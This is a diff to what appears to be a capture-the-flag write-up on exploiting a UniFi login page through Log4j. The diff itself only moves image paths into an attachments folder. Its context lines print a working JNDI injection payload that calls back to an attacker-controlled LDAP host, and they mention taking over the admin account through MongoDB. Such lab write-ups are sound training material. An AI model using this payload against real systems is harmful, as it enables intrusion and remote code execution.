@@ -104,7 +104,7 @@ Nmap done: 1 IP address (1 host up) scanned in 176.93 seconds
 
 The web page, a login screen:
 
-![](Pasted%20image%2020220415110325.png)
+![](./attachments/Pasted%20image%2020220415110325.png)
 
 We can exploit a vulnerability in [this version](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) of the software.
 
@@ -114,13 +114,13 @@ Fire up Burp and set it to intercept all request/responses.
 
 Then we need to provide the login screen with some random credentials and catch the login request.
 
-![](Pasted%20image%2020220415111300.png)
+![](./attachments/Pasted%20image%2020220415111300.png)
 
 In Burp we need to insert our payload into the `remember` field in the request.
 
 Payload: `"${jndi:ldap://10.10.14.15/whatever}"`
 
-![](Pasted%20image%2020220415111234.png)
+![](./attachments/Pasted%20image%2020220415111234.png)
 
 In tcpdump we can now see that we receive a connection from the server, this confirms that we can make it execute commands.
 
@@ -324,15 +324,15 @@ MongoDB server version: 3.6.3
 
 We should now be able to log in with the new password!
 
-![](Pasted%20image%2020220415131940.png)
+![](./attachments/Pasted%20image%2020220415131940.png)
 
 We are in!
 
-![](Pasted%20image%2020220415132048.png)
+![](./attachments/Pasted%20image%2020220415132048.png)
 
 UniFi has an ssh implementation we can make use of:
 
-![](Pasted%20image%2020220415132938.png)
+![](./attachments/Pasted%20image%2020220415132938.png)
 
 The root password for the SSH login is visible in clear text.
 
